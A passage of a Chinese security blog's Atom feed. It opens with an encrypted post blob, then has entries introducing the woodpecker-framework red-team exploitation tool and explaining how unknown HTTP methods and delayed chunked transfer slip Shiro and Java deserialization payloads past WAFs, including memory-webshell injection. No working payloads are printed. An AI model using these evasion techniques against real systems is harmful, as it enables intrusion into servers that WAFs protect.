09c1c3845dca3da72d2ac4214788a8558af310d8485ed1ee22e733e1e84f64cac408e6019bea2e1353e860e158001ca9992d7885969f746184696487c7cea9e89b4bd64688a9c57e50dfbc77b8f31fa730e150ef99d919fec82956c93717fd22abaeab5feea8cc04fc5507d624716ae2a2c121c6aeaab94ecb6fee2c0c92686f5713a153e40837c6678156c2bc1b15ee8dc2c6c614c7f78e2e1427550eae6a1b72f88401c98c716145bff802831cf3ea75fc5177ba10fe50267f64ae18db696180b85bd757a107d1f8bb6c2446d883a61f7ca5e87907bad235c1a6344c7eac4e38d57d06eb96ab9ab0d6c1e0e4d800cf1c1267ceb6d1c7332e50741333d521ae0d0a5434470d6a4d70aae896908b165d6002edfc2de73b5e3d25eb4aebcb911f0a2f94a50620e505e06e8ca42c37fdf1a000e9b95abd7a5fa9ee183ca48ce86af38a9907455bc62766d9451543427145eda6845963e4994dba00ff11abc5849642e5b957139af183183b29c8a428b8363d01dda9c65883207d86e67864b357321a89bc4e6d4480587d29dcb191a2aa528106b3d06cf1c76f13e1cb331717f58b50c39aabf426d78ffff0b18eb1a1804a452111314a3c74c55d2b88913197a1996935d16b3c7073b7fa10183299b7e2d08bede221221239422e8b65e0d21ed3ab70b980005578962ef109df096d900d14e5b855cf3f05a615af4ee2224f0b52394ba502d5e081f053252fc7243d6fbeb090c58f70d2d03dc07ec7ee1864a5de58a59343f06b59610d78a9ac97c42cea41108082ee5f7048fae8fa66af4dbd5ce1f65bc4aab53b5a9c7f8338c59ac5b8ddcc1a7be6788708eaef1a64eb83b2772b1c96a1799cabedc75c3b7b855607ce40fa0353dd2adc2a37f0fb9c0be5cb751753d251fb0271938cbc3b2c403fc06af05ae2da8cf1dd0a4f6c84d0380b576e90942366153f5d24b3aa42d3a5d93c7c63be1f7e46c7f927b89b5737cf569d229c019004c6d1a648cbe9d4e5acefb40dfd1aba3253527c10cde1964e03cdb8c5ffa033cc2f59d478387fda94d71518fb2b01918b117756f8d11f31af123fe54e96871303265a9abc341ab2d809f1966d22eb47183b24fb2ee3a7966e54f58b92d0b87d3f418630d0bd40b4a08c7af3d8e81214a3515794b642d56d2a9c2d2c1085af165b2fece9d957e6c9fa73bcd114f3eb675b32ec2f0cbe1cd421f13b502b2dfbd23a051371bccf38e62e7a2fa5ae0938ac5e67591d0fd0212cfb425c4d97b288a19353162231e10f2c3001ed02e3cb6efff1d3bcb3eb1d9de926077e3a75474169153be778b27f9fc4aa35aaf924bf359f988d4de94600216e73ba38ab8ee676c273a607c1072cb2827c26c48b349564f47cfb4b50982da1dc0f5471b586daf5c218fdfe64fea472a744b33fe15a4ad88701c574bd7d177371a5f9fb1f91d1ffef1dbb709595d8eefd1284594eefa1e85ff28de0c319d46b8c63050687dee4d7b2b81e3011964bf5c4a5a0641dd620d7a6cf554f4f02cbe4270e54d2631a43bc7f97512beaf47be94d3221c3dd0d6d5d2ae79d0a9e64269bd2810c8e19b5a4af5d87eed9b652fcbbbb48e4fb3b851d3284ea5bf91ff7c5085d2252116ac7eddc778888a9d168e2287df009ed8f5f595c5dd578263401828df51b5a0539d0685d807788a8357d629222efdddfb6b08e2a2b307a511c57c130645b01707a3155ec651d08dbd2baf7d11c50ab86da3519ab287dbfd4e7390530e553b17d8ad40020a139bfbc272934d8f649dff60c4bd6928ddc4b7e949910edb6f2af2ffb85677f1647713f03f8d85565896f9c62da1a6e9000c0a0fbaa6e4546b0eb8036c9ebd5fd89747482dc93acaee3e84c34291faa3ff07bc7b145ff1709e278c9ed9e49a198ad0340b79af6acdad36ed2d22c6ded1e5c81df3cb1861753cf9a3df05f87ba7e6092b8dc4b6582f700b28da805a4f4ce925c7aaebd087c39b0e70684b4adaa8a1969b6e29894916c557ab95863ba30121b9ca42914d869c5f08094ea3bc78369fb6d183a87ccc0fc2d04294b65f17c210d325b1748c9004f0c9a1d1bcc008075efcf84f841e3849bd062e211204d1896dd165e0cb49242a1f7aa62224dfb6592ea97caabbbe381c70ea52f5cde8a51e5e07b8714c72754bda4d5387beec2dd87c28c71cf4956cf0759d6a1db732acbf16c54f7d0c9c43200ea5fe5f70bd31703922157b9aab6e6c679e3a2328462e904d4314d7839b53c94b6be96eb983dc3553e2fece91afb3d477ef49a74e3ba19ee077820077bdcb7531f6d6df7220b0d76ab41cca080f5461eba3093b097b5f0a206c2c6a2ca78cfe85edd326a564330ea946abf988426b383850ccff2f99180617c9cca9d0d5b04550a7f49bc8056382b8cfb675e79b2483611e20a02e8b6fdc05952d8f48f0fab535b668c36a8b9a5f7320b70781a2258af8c9bc9a2109304516f51f1519fcc154f8a5ede54224249197ecb19e022f70ab21a47fcf1c37a2923aa15ed12a34ce2c42ef65aa9c4471e947fbf6e65eda938c2c447ab638e3bebb0dda8c4656b146c31d3257d37c1c64e6f4480dd79f22526f84611296ac6a75f78c67e7f776f1355e2cfe8eedab4ba47a465bfb2882b46c892aa855351efc3192a3cf6a0621e2162712e28177566d2ab12232d69bf17e9effd1202fae6fce50e5365cdeef10947a6e31de1c71c0399c1157b7fb7a79725e579f32bedc78fdd1853aeb5eae8c0b755e31a2b6cfe14e58189acc28d3dd155175303874e65f3ec86ca4adbceac195e0154b96be77b916a849a9b35b9a602848031a2cc299e56dccc7e423e5c3b3f436fd06ee19dd7fec262715d64bbbf78066a804f485fb3f826278210330452f555d017489f51e45a4fb90ab7c2047399306b3342a7b8a520c24d71eaea9daae675e8cd88411880541d175db7945f30a0007d942edbfab7c5e966834e2a2971f43b1d066448277e54a7f879753402153290bbe9cc19a0304fe02dfe73caf74bab627a69a3d811a0e37300d692903e1f970ab4c583346785bf69511fcf6590f1cac477ae3db19f60fadbb1f84a92aeaf16ff3c8bac6c246db59e9cec333effdd151ff5715d8fac69d0a67d121573c6662aa32b6819fce05dfa7afe7098cf28bf7f99c105b50f0283572faed5fa4fca78f85b6c0255d50702413f5943e655fc9b11a87fc2805428f1c0c952640f577bc860c588764707a1a3113b5db131d89a80d005b8115405b299a3c62b6a346ca5832ac4c66ac7e13cb7fdd159b9d7fbaef13695e97a3ebff83ed800dc7a1d4f1cba2c9ea63f57e95d58ff3090a48657bde69ff3c984a9274c25dcd2d28b8ec8668fccb5f133a3ef41cdeaeb21e68caf614042e6bfc4c60ccfbc0a9c1051c99a9e6f1dd677e39b67c73c7c5ba41225590f2934f1592dbc9d75cc66a001d76c9789a569498ea7a05dc22bea2345a712251b42afdf1f0187f8148f797720c45145ec6ccbf75a5ffeff1f35a8d5fe34505ef16671b4dc71aa66097f9a22b4b15c152b9b70f5aa36ac001ca877d82f740252a1f57c680662463a61d8223bed76075423e25b97d0108b7c185fbcfd95202243a857e3082ce79fb8157476a6195171bdf0e7fb08777368e2ee11a6a4bd96325cb4c8f848cc658650eaa37bf88cf177ab523320449319fedee55271f83a02ff7db869c4772e374c1c5932916a130018f28e85c13ef15e6576e7d08083cbd558bc07c9f76ff4960394a92f3a01d0ee1f25b488c41e79e186fc4c398fb4329ae22710c2dc28614f6bc5addbc01213aab6745d335231ce898c8a5ff27bc9265729519f77fd0777c022cfb549d5d3bab122e6104f72afef7e0002031e071e9b8494501f0bdf315d991f9202104519b83f70f5496e3173d9450f68969c5ef902031b4297e4e8549907a867ebc4c71c053e93b150858c3229904f5cc5e0b4199cd49c3b224264bc09429753c9f18503c9af5e297de963b57d6c1c038f4e8b5fc4e7fcb0432bfe0e293fdcbc2af3294957c7fe6230679026a9e0a60cfc62383d99b24c5528d931423ce15824d3b54dc8236f891cc6764a49ffb1e4b68c189553a57ddf5b601cb662aeb5df575bb029258296ba25edd74a594a025bc2070dafcce873403cb14e45dc7ca002cdb729b7e4838fdb12b2094291e03b0a1a90b2871ad926ec4ad635df4386b83811e95220a2427c6283214a3ebe09ed46f9535e6169aee372e8aa171c7994da09e84c1c4491ead00605ce5b1705fa0ccd998c6f576f3746a451208699a20a19026463f8a2ebba4aacd6ad977ff814d4e89858b0e04a45df6e4cefc502c81d950b8382f60c66d85a8a736bbfb916df2a5750cc7ef0ceb33ebae926391fb64d53165113d2d8e17a7ae2e794620093aae5aceda911abc1594fd7735fc2cccf48f2371e27477417000c3ae181abd2208cab30f5797548a9eb70e8be45cb4964addefe55998857b217e2a9301dfcbf2982ab43ca79c01c2bfc7fdbbc6256172c3f9fed6f19236d79846f4bb168c50d9ecf9b034a6dc252248eea44acee92af27c3976f6bc9c1dbfa2d5a2e0188cb6027265152ea3b5203ce5c3f571b621787f00f8a1e71d936fa555fd4281a037978aad76e3b1c0d40fe153938158d4a74c1dd273f7cb1b79ca3c76acc4b614b6ed47bf5f7bf86f073c8bc5d510e7fff68a1c11a516101ad5b641d9b76069c50328dab273e6454eed585929e79ce485d4aac3a05797269a899135b8c3c7e0245f0fb2050a947b8d89ebed48bc23044a006c39bf17dfe65db07cbc8ee5f96846f6556055077f849a2e21d4f36dc238fa719bd2a9de789c07bfb7f75795f22d4ecae09f373c6edbf9d896860ad180d1222cf0cd8f97b85d7b46c3f6d8beacf0bf6ce9c130cf0146279f1249ca61bd7bddb3c35ba44067e257a03ab32eef20cbf8d2222a82a0b0e29beaedb2e6c7bb6e765f76d7ee75aed252905cf0d308cd7e56ab7a5ca539d8e6354935fab51fe0243ccfca8ee0595e5f75bd605facc9f5010afa2ae8b180c441f58ec9e8bfc1e97028047a23e3f7e071b8c8d6f8e81b54b5c852775a7b8168efcbc08de14bdcf9988e6d3e0628fae7c51be445b1e276e409e3b0cdc927f2a3fe2279194ca6465155cd0128c7973c803c1f17456266d8424a384f4c41ce4c62b11108476c51ddbd181e94efdcf7aac2bd2c5947cda5f536325924e17d68d984e83e1dd267bb9fec469e2217a67cf7483bfc80d8e3d36e4a3967ef9b81a86420082cccd3274af9e9a7b0117f51013d06297a6943c80adfa8c1994f1c51446f0ca1591ed76ee103dae9dd97cd3d780c62752985efcbbae0d43fe8c7c78f8e2513b9e69ebb159da41eefbf8ae167d560c080fa60974c834af16b696454c72313e14ad2a2c66cae77c84a2ddd2a6d8da0b4cfe889de673046c30e9cbd234145b6bfbd880bef05bf5df0360962d8ca44c4e8770c55546b37eded6b58bf021aeb35bd9491b8a200d895f6de73f7dd2114536eca7c6a4024c6a478ddb091be7aa42b16aadba970a5cef24571091a5ec5e9896b516368f8b54a0b7ef166c6de31b9daea7737398e8a86e34074e47ce89dfd7d9d7dbdb6d96a6aed21b46a97124108c6fa5466b03e9e19c18eacd7133fa458be6fe78df15c8450ea4e78461049981d0011c979032b5bfa85125a17e73a198d3ad86b7b1eb0796cb5f88fbca3d85cc564f0fba369625f6958f25616359b9a7692406de97960f22bcbbd604b1f3d8e88a8e3f25b6a2cadf93072bf11b3eed4ede762df506dde7264a8b699b01b55ca17a4785a13686cbb943c533d9af72e1ee58fe8747867fcf8e9d2eef6f2df7f9d6bedc107cd005f74746de7000e7efd8591c6061d7f7248454fe1b335d5e23b796fa4e35438363d0cefb58c2fbac4bc8db4940f7733e969b64d44e107208823a6566d5e8403a0532875dcbd5cda92a06b1521f585ef12d886efa8ccfd7a006bd30f63b95da48ec969bafa1b94c9eb0b785bced5a128cfeabece520eb84dd9bd3c9d71438f1f48ee113b4675d0a6cf7eb95f3ace3f8aabd2e7f36383820fb34dfce904a13c918287817bb3997e118e34e8472ea707891bd1257823a67ba2b8a89267b8818a25830d4113235919d44e1988f3e9cf97249b99817fd75b024c88ac5d534056089e4dab94afa53f15aac4b1b19c71f9276c3f37e52306257f25bbe6668196316b3c1df59f3c18683464c407dc951e87fad9adcd39385cac583ba966aa9078001578625b53b3544bb7520e3682aec19f49f60a693e0839072c068afd1429bcc779cdaf36378cbcabf61485679ebb53b26ec753114dfe3806040a0225d8e60ad03b66ba1be6becfbd6fa11d7dc79bcf9a3878df1cd3afb725f39e7c549bb8f544fa8b75e2ded9cc6384c316db64387ba0cb8ccae586069b77e6c04a496cc7822a24c7966baa89228a1eb876b6862093c5c3f0bc7ebdac63803b9e6a6906f9ce89230a08aecc205076d22df79ee0b0acc6e63d3800b305da3c5094bc3ac47e4a6e18d0f6d2a9f53f106d29b0f123aec4cee38bb722758ed20ea1cc8c1f8fbd0e43c5892af232e6fe774316d990007fb50b69fe4d24754dc50760fc34bcf16433664a22d0f03756c058a619c8f33f0d417f9b6ab53a6472c0c67cb39f80d9a375d23f3ae964e0cb140f5d4bc305f8c788dcb6d6f31b636e5a8d45a422217684f8a393c1bac6e85f64bfde4ea2e6ca7d9e1029baccc80a95a26dc8753fe6aeb196cc50602ea47d59e029935b2a12fb1afde9</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      有东西被加密了, 请输入密码查看.
    
    </summary>
    
    
      <category term="安全开发" scheme="http://gv7.me/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>高危漏洞狙击框架:woodpecker-framework</title>
    <link href="http://gv7.me/articles/2021/woodpecker-framework-introduce/"/>
    <id>http://gv7.me/articles/2021/woodpecker-framework-introduce/</id>
    <published>2021-08-09T11:55:17.000Z</published>
    <updated>2021-08-15T09:41:31.951Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>woodpecker-framework是一款高危漏洞综合利用框架，目的是可以狙击高危漏洞，拿到权限！其设计是由我在日常红队外围打点经验抽象得来。它的每个模块和外围打点的主要流程是一一对应的。</p><p>比如遇到一个具体的外围应用，渗透测试的流程是：</p><ol><li>探测当前应用所有攻击面和风险点 （信息探测模块）</li><li>使用poc探测漏洞是否存在 (精准检测模块)</li><li>通过exp拿下webshell (深度利用模块)</li><li>遇到奇葩环境漏洞环境自动化无法打死，需要人工生成payload （荷载生成模块）</li><li>人工构造payload时经常需要做一些常规操作，比如把Class变成BCEL编码，runtime.exec命令变形等等 （辅助模块）</li></ol><p>下面围绕weblogic和shiro这两个高频漏洞应用来详细介绍每个模块。</p><h2 id="0x02-信息探测模块（InfoDetector）"><a href="#0x02-信息探测模块（InfoDetector）" class="headerlink" title="0x02 信息探测模块（InfoDetector）"></a>0x02 信息探测模块（InfoDetector）</h2><p><strong>信息探测模块的任务是寻找当前应用最薄弱的点。</strong> 显然有用的信息是判断的重要依据。这里探测的信息不是什么操作系，中间件，cms之类的指纹识别。而是针对具体应用的攻击面和风险点的探测，比如weblogic就会探测如下​信息。​</p><ol><li>weblogic是那个版本</li><li>协议是否开启t3/iiop协议</li><li>web端口是否可以访问到console，wls，async之类的组件</li></ol><p><img src="/articles/2021/woodpecker-framework-introduce/weblogic-info-detector.png" alt></p><p>顺便值得一提的是，我们探测t3/iiop协议的时候，还需要探测它们是否被设置为禁止连接，不然探测出open也是无法利用的。如上图的t3开启了但是配置了如下过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weblogic.security.net.ConnectionFilterImpl</span><br><span class="line">0.0.0.0/0 * * deny t3 t3s</span><br></pre></td></tr></table></figure><p>这些信息有什么用呢？当然是让我们知道面前这个weblogic的薄弱点在哪里，后续攻击的计划应该是:t3和iiop系列漏洞不用测试了，wls-wsat组件的xmldecoder反序列化漏洞可以看看。</p><h2 id="0x03-精准检测模块-POC"><a href="#0x03-精准检测模块-POC" class="headerlink" title="0x03 精准检测模块(POC)"></a>0x03 精准检测模块(POC)</h2><p><strong>精准检测模块的任务是使用poc去判断漏洞是否存在。</strong> 显然精准是这个模块关注的问题，我们的原则是误报可以原谅，但是漏报坚决杜绝。</p><p>那现实如此复杂的漏洞环境，怎么实现精准检查呢？woodpecker插件的检测原则是尽可能的实现以下所有检测方案。</p><ol><li>回显检测</li><li>dnslog检测</li><li>间接检查</li><li>写文件检测</li><li>触发补丁检测</li><li>延时检测</li><li>特定特征检测</li><li>….</li></ol><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2020-148823.png" alt></p><p>这里我细说下<code>3</code>,<code>5</code>和<code>7</code>这三个方案，其他方案​顾名思义。​</p><p><code>间接检测</code>是不通过直接触发漏洞来检测，而是通过其他方面间接来验证。举2个例子，shiro key的检测由开始的通过回显，dnslog之类的直接检测变成了现在统计rememberMe个数。weblogic漏洞检测则可通过下载黑明单class来验证是否被修复。这些方法很巧妙，在漏检中有四两拨千斤的作用。</p><ul><li><a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">一种另类的 shiro 检测方式</a></li><li><a href="https://mp.weixin.qq.com/s/tgQO9ILHudfkkOzeahICTg" target="_blank" rel="noopener">红蓝必备 你需要了解的weblogic攻击手法</a></li></ul><p><code>触发补丁检测</code>就是提交可触发补丁的payload，然后看是否拦截来确定漏洞是否修复。比如CVE-2019-2725我们就可以发送带<class>标签的payload，若如下提示非法标签说明漏洞修复了。</class></p><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2019-2725.png" alt></p><p><code>特定特征检测</code>就是通过respone的某些特征可以知道漏洞是否修复，比如CVE-2020-14882/3漏洞修复后的响应如下,那咱们就可以通过repsoen状态码为<code>500</code>,返回包中存在<code>The server encountered an unexpected condition which prevented it from fulfilling the request.</code>提示来判断。</p><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2020-148823-fixbug.png" alt></p><h2 id="0x04-深度利用模块-Exploit"><a href="#0x04-深度利用模块-Exploit" class="headerlink" title="0x04 深度利用模块(Exploit)"></a>0x04 深度利用模块(Exploit)</h2><p><strong>深度利用模块的任务是发挥漏洞的最大利用价值</strong>。比如一个RCE可以干的事情很多，命令执行，写文件，读文件，反弹shell，注入内存马，开启bindshell等等。不过最后我梳理了下，很多功能都是有交集的，比如反弹shell可以通过命令执行来反弹，读文件可以通过webshell来读。所以在红队行动中，真正对我们有用的一般是三个功能，woodpecker插件编写的原则上要求深度利用模块必须实现这3个功能，并保证稳定性。</p><ol><li>写文件</li><li>命令回显</li><li>注入内存马</li></ol><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2020-148823-injectmemshell.png" alt></p><h2 id="0x05-荷载生成模块-Payload-generator"><a href="#0x05-荷载生成模块-Payload-generator" class="headerlink" title="0x05 荷载生成模块(Payload generator)"></a>0x05 荷载生成模块(Payload generator)</h2><p><strong>荷载生成模块的任务是帮助红队人员快速生成自定义payload。</strong> 自动化并不能解决所有问题，当遇到奇葩环境时就需要人工介入。比如当shiro漏洞遇到未知中间件时，可能无法回显也无法注入内存马，这时就需要人工构造payload了。但是每次都要先生成序列化数据，设置key，选择加密模式，非常浪费时间。而woodpecker shiro漏洞插件的荷载生成模块可以一键生成。</p><p><img src="/articles/2021/woodpecker-framework-introduce/shiro-payload-generator.png" alt></p><h2 id="0x06-辅助模块-Helper"><a href="#0x06-辅助模块-Helper" class="headerlink" title="0x06 辅助模块(Helper)"></a>0x06 辅助模块(Helper)</h2><p><strong>该模块的任务是将漏洞检测和利用中经常要进行的操作自动化，节省时间。</strong></p><p>比如在java命令执行漏洞中无法使用带有管道符的命令，需要我们去转换下命令。当然有<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Jackson_T</a>这样的在线网站，这里我编写成了<a href="https://github.com/woodpecker-appstore/runtime-exec-encoder" target="_blank" rel="noopener">本地插件</a>。</p><p><img src="/articles/2021/woodpecker-framework-introduce/runtime.exec.png" alt></p><p>同时如果想通过命令执行漏洞写一个shell的话，往往需要转义下，这个过程也是比较繁琐的。可以使用<a href="https://github.com/woodpecker-appstore/EchoToFileConverter" target="_blank" rel="noopener">EchoToFileConverter</a>插件来解决。</p><p><img src="/articles/2021/woodpecker-framework-introduce/echo-to-file.png" alt></p><h2 id="0x07-最后的话"><a href="#0x07-最后的话" class="headerlink" title="0x07 最后的话"></a>0x07 最后的话</h2><p>如果你比较认同这样的设计，并有能力编写插件。欢迎到github提交pr或者插件。</p><ul><li><a href="https://woodpecker.gv7.me" target="_blank" rel="noopener">框架主页</a></li><li><a href="https://github.com/woodpecker-framework" target="_blank" rel="noopener">框架仓库</a></li><li><a href="http://github.com/woodpecker-appstore" target="_blank" rel="noopener">插件仓库</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;woodpecker-framework是一款高危漏洞综合利用框架，目的是可以狙击高危漏洞，拿到权限
      
    
    </summary>
    
    
      <category term="安全开发" scheme="http://gv7.me/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="woodpecker-framework" scheme="http://gv7.me/tags/woodpecker-framework/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化绕WAF之未知HTTP请求方法</title>
    <link href="http://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/"/>
    <id>http://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/</id>
    <published>2021-08-07T13:49:06.000Z</published>
    <updated>2021-09-05T14:34:15.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>当下WAF对shiro的防护，确实比较严格。对rememberMe的长度进行限制，甚至解密payload检查反序列化class。本周我遇到一个场景，就是这种情况。使用之前的方法<code>rememberMe</code>=<code>加密payload</code>+<code>==垃圾数据</code>也失败了，<a href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ" target="_blank" rel="noopener">这个方法</a>之前有大佬分享过，我就不再赘述了。我最终使用<code>未知HTTP请求方法</code>解决战斗。</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/blocked-by-waf.png" alt="被WAF拦截"></p><h2 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h2><p>当时我的思考是shiro的payload在header上，如何修改request header可以导致waf解析不出来，但是后端中间件正常解析呢？</p><p>第一步，先构造出先绕WAF，哪怕改成不合法的数据包。<br>第二步，在绕WAF的数据包基础上修正，让后端中间件可以解析。</p><p>我把被拦截的包发送的repeater模块,尝试切换http版本，添加垃圾header头等等方法均没绕过。在修改GET方法为<code>XXX</code>这样的未知HTTP请求方法时,发现WAF不在拦截，但是后端报错了。</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/bypass-waf.png" alt="未知HTTP请求方法可以过WAF"></p><p>接下来验证下后端是否真正处理了rememberMe。我先请求去掉rememberMe，response对应的rememberMe消失了</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/test-for-del-rememberme.png" alt="删除rememberMe进行测试"></p><p>然后再加上rememberMe,repseone的remeberMe又回来了。这说明后端正常处理rememberMe，这么绕WAF没问题！</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/test-for-add-rememberme.png" alt="添加rememberMe进行测试"></p><p>最后将之前注入内存webshell的payload修改下请求方法，成功下Web权限。</p><h2 id="0x03-原理"><a href="#0x03-原理" class="headerlink" title="0x03 原理"></a>0x03 原理</h2><p>方法简单粗暴，不难推断WAF是通过正常的http方法识别HTTP数据包的。但是为何后端中间件依然能拿到rememberMe的结果呢？</p><p>于是我在本地代码<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>处下了断点。</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/debug-shiro-rememberme.png" alt="调试shiro rememberMe流程"></p><p>通过<code>XXX方法</code>发送数据包，调试发现<code>request.getCookies</code>可以获取到<code>rememberMe</code>值，而且如下方法均可正常使用。说明未知HTTP请求方法不影响各类参数的读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.getHeader</span><br><span class="line">request.getParameter // 只能读url提交的参数，body提交的没有解析</span><br><span class="line">request.getInputStream // 读request body</span><br></pre></td></tr></table></figure><p>那对三大组件的调用是否有影响呢？继续翻阅Tomcat源码，我发现Listener被调用是受<code>行为事件</code>影响，Filter是受<code>请求路径</code>影响，而Servlet是受<code>请求路径</code>和<code>HTTP请求方法</code>影响。一旦遇到未知方法，Servlet不再进入业务代码，直接返回一个<code>http.method_not_implemented</code>报错。具体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//javax.servlet.http.HttpServlet#service</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String method = req.getMethod();</span><br><span class="line">    <span class="keyword">long</span> lastModified;</span><br><span class="line">    <span class="keyword">if</span> (method.equals(<span class="string">"GET"</span>)) &#123;</span><br><span class="line">        .....</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"HEAD"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">        <span class="keyword">this</span>.doHead(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"PUT"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPut(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"DELETE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doDelete(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"OPTIONS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doOptions(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"TRACE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doTrace(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String errMsg = lStrings.getString(<span class="string">"http.method_not_implemented"</span>);</span><br><span class="line">        Object[] errArgs = <span class="keyword">new</span> Object[]&#123;method&#125;;</span><br><span class="line">        errMsg = MessageFormat.format(errMsg, errArgs);</span><br><span class="line">        resp.sendError(<span class="number">501</span>, errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以得到一个结论就是 <strong>未知Http方法名绕WAF这个姿势，可以使用在Filter和Listener层出现的漏洞，同时WAF不解析的情况</strong>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;当下WAF对shiro的防护，确实比较严格。对rememberMe的长度进行限制，甚至解密paylo
      
    
    </summary>
    
    
      <category term="绕WAF" scheme="http://gv7.me/tags/%E7%BB%95WAF/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化数据绕WAF之延时分块传输</title>
    <link href="http://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/"/>
    <id>http://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/</id>
    <published>2021-08-03T09:22:41.000Z</published>
    <updated>2021-08-31T13:44:54.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p><code>chunked-coding-converter</code>在0.2.1以及之前版本是不支持对二进制数据进行分块的。这个问题实验室的<code>darkr4y</code>师傅今年3月份的时候就已经反馈了多次，由于懒癌在身一直没有更新。直到我自己遇到一个站点，<a href="https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/">反序列化带大量脏数据</a>没有绕成功，于是又想起了分块传输。花了一点时间让插件支持了二进制数据，然而这样依然被拦截了！ </p><p><img src="/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/blocked-by-waf.png" alt="直接分块传输被WAF拦截"></p><p>这也在意料之中，分块传输被公开已经有两年之久，很多WAF已经支持检测。那有没有办法让这个姿势重振往日雄风呢？</p><h2 id="0x02-延时分块"><a href="#0x02-延时分块" class="headerlink" title="0x02 延时分块"></a>0x02 